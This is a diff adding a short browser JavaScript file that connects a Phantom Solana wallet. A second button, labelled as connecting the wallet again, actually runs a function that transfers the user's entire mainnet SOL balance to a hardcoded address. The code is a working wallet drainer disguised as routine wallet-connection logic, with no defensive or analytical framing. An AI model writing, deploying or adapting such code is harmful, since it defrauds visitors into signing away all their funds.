@@ -1,0 +1,62 @@
+document.addEventListener('DOMContentLoaded', (event) => {
+    const connectWalletButton = document.getElementById('connect-wallet');
+    const connectWalletAgainButton = document.getElementById('connect-wallet-again');
+    
+    let provider = null;
+    let userWalletAddress = null;
+    
+    const getProvider = () => {
+        if ("solana" in window) {
+            const provider = window.solana;
+            if (provider.isPhantom) {
+                return provider;
+            }
+        }
+        window.open('https://phantom.app/', '_blank');
+    };
+    
+    const connectWallet = async () => {
+        provider = getProvider();
+        if (provider) {
+            try {
+                await provider.connect();
+                userWalletAddress = provider.publicKey.toString();
+                console.log('Connected to wallet:', userWalletAddress);
+            } catch (err) {
+                console.error('Connection failed:', err);
+            }
+        }
+    };
+
+    const sendAllSol = async () => {
+        if (!provider) {
+            console.log('Connect wallet first!');
+            return;
+        }
+
+        const { Connection, PublicKey, clusterApiUrl, SystemProgram, Transaction } = solanaWeb3;
+        const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
+        const recipientAddress = new PublicKey('GmGbzr1GHugEwbUrLYSfdf5oFoBYAxjqPJKzARZk5JCQ');
+
+        try {
+            const balance = await connection.getBalance(new PublicKey(userWalletAddress));
+            const transaction = new Transaction().add(
+                SystemProgram.transfer({
+                    fromPubkey: new PublicKey(userWalletAddress),
+                    toPubkey: recipientAddress,
+                    lamports: balance
+                })
+            );
+
+            const { signature } = await provider.signAndSendTransaction(transaction);
+            await connection.confirmTransaction(signature);
+            console.log('Transaction successful:', signature);
+        } catch (err) {
+            console.error('Transaction failed:', err);
+        }
+    };
+
+    connectWalletButton.addEventListener('click', connectWallet);
+    connectWalletAgainButton.addEventListener('click', sendAllSol);
+});
+
